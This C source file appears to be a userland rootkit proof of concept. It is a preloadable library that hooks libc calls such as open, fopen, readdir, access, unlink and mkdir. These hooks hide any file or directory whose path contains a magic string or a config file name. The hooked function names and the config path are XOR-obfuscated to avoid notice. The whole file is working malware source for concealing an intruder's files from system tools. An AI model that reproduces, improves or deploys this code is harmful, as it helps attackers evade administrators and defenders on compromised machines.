#define _GNU_SOURCE // Activates all GNU C Library extensions

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <errno.h>
#include <stdbool.h>

#include "xor.h"
#include "const.h"
#include "poc.h"

// Set up syscall hooks
void init(void) {
    DEBUG("[rootkit-poc]: init called\n");

    if (poc_is_loaded) {
        return;
    }

    for (int i = 0; i < SYSCALL_SIZE; ++i) {
        char *scallname = strdup(syscall_table[i]); // duplicates the syscall name

        xor(scallname); // decode

        strncpy(syscall_list[i].syscall_name, scallname, 50); // copy the name to the structure
        syscall_list[i].syscall_name[50] = '\0'; // null-terminated

        syscall_list[i].syscall_func = dlsym(RTLD_NEXT, scallname); // gets the pointer to the original syscall function

        cleanup(scallname, strlen(scallname)); // clears allocated memory
    }

    poc_is_loaded = 1;
}

void cleanup(void *var, int len) {
    DEBUG("[rootkit-poc]: cleanup called %s\n", (char *) var);
    memset(var, 0x00, len);
    free(var);
}

int is_invisible(const char *path) {
    DEBUG("[rootkit-poc]: is_invisible called\n");

    char *config_file = strdup(CONFIG_FILE);

    init(); // hook configurations

    xor(config_file);

    // Checks if the path contains the MAGIC_STRING
    if (strstr(path, MAGIC_STRING) || strstr(path, config_file)) {
        cleanup(config_file, strlen(config_file));
        return 1; // invisible
    }

    cleanup(config_file, strlen(config_file));

    return 0; // visible
}

// Hooked access function to hide invisible files
int access(const char *path, int mode) {
    DEBUG("[rootkit-poc]: access hooked\n");

    if (is_invisible(path)) {
        errno = ENOENT;
        return -1;
    }

    // Calls the original access function if the file is visible
    return (long) syscall_list[SYS_ACCESS].syscall_func(path, mode);
}

// Hooked readdir function to hide invisible directory entries
struct dirent *readdir(DIR *dirp) {
    DEBUG("[rootkit-poc]: readdir hooked\n");

    struct dirent *dir;

    do {
        dir = syscall_list[SYS_READDIR].syscall_func(dirp);

        // Checks if the entry is not NULL and if it is “.” or “..”
        if (dir != NULL && (strcmp(dir->d_name,".") == 0 || strcmp(dir->d_name,"..") == 0)) {
            continue;
        }
    } while (dir && is_invisible(dir->d_name));

    return dir;
}

// Hooked fopen function to hide invisible files
FILE *fopen(const char *filename, const char *mode) {
    DEBUG("[rootkit-poc]: fopen hooked %s\n", filename);

    if (is_invisible(filename)) {
        errno = ENOENT;
        return NULL;
    }

    return syscall_list[SYS_FOPEN].syscall_func(filename, mode);
}

// Hooked opendir function to hide invisible directories
DIR *opendir(const char *name) {
    DEBUG("[rootkit-poc]: opendir hooked\n");

    if (is_invisible(name)) {
        errno = ENOENT;
        return NULL;
    }

    return syscall_list[SYS_OPENDIR].syscall_func(name);
}

// Hooked open function to hide invisible files
int open(const char *pathname, int flags, mode_t mode) {
    DEBUG("[rootkit-poc]: open hooked\n");

    if (is_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return (long) syscall_list[SYS_OPEN].syscall_func(pathname, flags, mode);
}

// Hooked mkdir function to hide invisible directories
int mkdir(const char *pathname, mode_t mode) {
    DEBUG("[rootkit-poc]: mkdir hooked\n");

    if (is_invisible(pathname)) {
        errno = EACCES;
        return -1;
    }

    return (long) syscall_list[SYS_MKDIR].syscall_func(pathname, mode);
}

// Hooked mkdirat function to hide invisible directories
int mkdirat(int dirfd, const char *pathname, mode_t mode) {
    DEBUG("[rootkit-poc]: mkdirat hooked\n");

    if (is_invisible(pathname)) {
        errno = EACCES;
        return -1;
    }

    return (long) syscall_list[SYS_MKDIRAT].syscall_func(dirfd, pathname, mode);
}

// Hooked rmdir function to hide invisible directories
int rmdir(const char *pathname) {
    DEBUG("[rootkit-poc]: rmdir hooked\n");

    if (is_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return (long) syscall_list[SYS_RMDIR].syscall_func(pathname);
}

// Hooked link function to hide invisible files
int link(const char *oldpath, const char *newpath) {
    DEBUG("[rootkit-poc]: link hooked\n");

    if (is_invisible(oldpath)) {
        errno = ENOENT;
        return -1;
    }

    return (long) syscall_list[SYS_LINK].syscall_func(oldpath, newpath);
}

// Hooked unlink function to hide invisible files
int unlink(const char *pathname) {
    DEBUG("[rootkit-poc]: unlink hooked\n");

    if (is_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return (long) syscall_list[SYS_UNLINK].syscall_func(pathname);
}

// Hooked unlinkat function to hide invisible files
int unlinkat(int dirfd, const char *pathname, int flags) {
    DEBUG("[rootkit-poc]: unlinkat hooked\n");

    if (is_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return (long) syscall_list[SYS_UNLINKAT].syscall_func(dirfd, pathname, flags);
}

// Hooked stat function to hide invisible files
//int stat(const char *path, struct stat *buf) {
//    DEBUG("[rootkit-poc]: stat hooked\n");
//
//    if (is_invisible(path)) {
//        errno = ENOENT;
//        return -1;
//    }
//
//    return (long) syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, buf);
//}

// Hooked lstat function to hide invisible files
//int lstat(const char *file, struct stat *buf) {
//    DEBUG("[rootkit-poc]: lstat hooked\n");
//
//    if (is_invisible(file)) {
//        errno = ENOENT;
//        return -1;
//    }
//
//    return (long) syscall_list[SYS_LXSTAT].syscall_func(_STAT_VER, file, buf);
//}

